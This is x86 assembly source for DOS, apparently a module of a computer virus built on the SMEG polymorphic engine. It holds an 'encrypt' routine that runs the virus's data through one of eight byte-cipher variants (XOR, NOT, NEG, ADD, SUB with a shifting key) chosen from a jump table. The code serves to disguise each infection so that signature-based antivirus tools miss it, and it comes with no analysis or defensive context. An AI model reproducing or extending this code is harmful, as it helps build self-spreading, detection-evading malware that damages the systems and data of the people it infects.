include macro.inc
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
encrypt:
        push_all_register
        mov      bx,offset(dataarea_for_SMEG-virus)
        mov      di,ds:[bx+targetptr-dataarea_for_SMEG]
        mov      si,ds:[bx+sourceptr-dataarea_for_SMEG]
        mov      cx,ds:[bx+datasize-dataarea_for_SMEG]
        mov      dl,ds:[bx+cryptval-dataarea_for_SMEG]
        mov      bl,ds:[bx+crypt_type-dataarea_for_SMEG]
        and      bx,0fh
        add      bx,bx
        add      bx,offset(crypt_table-virus)
encrypt_byte:
        lodsb    ;AL<- DS:[SI]
        call     word ptr [bx]
        stosb
        loop     encrypt_byte
        pop_all_register
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
crypt_table:
        dw       offset(crypt0-virus)
        dw       offset(crypt1-virus)
        dw       offset(crypt2-virus)
        dw       offset(crypt3-virus)
        dw       offset(crypt4-virus)
        dw       offset(crypt5-virus)
        dw       offset(crypt6-virus)
        dw       offset(crypt7-virus)
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
crypt0:
        xor      al,dl
        inc      dl
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
crypt2:
        xor      dl,al
        mov      al,dl
        dec      dl
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
crypt3:
        not      al
crypt4:
        xor      al,dl
        inc      dl
        inc      dl
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
crypt1:
        xor      al,dl
        neg      al
        dec      dl
        dec      dl
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
crypt5:
        add      al,dl
        inc      dl
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
crypt6:
        sub      al,dl
        dec      dl
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
crypt7:
        xor      al,dl
        dec      dl
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
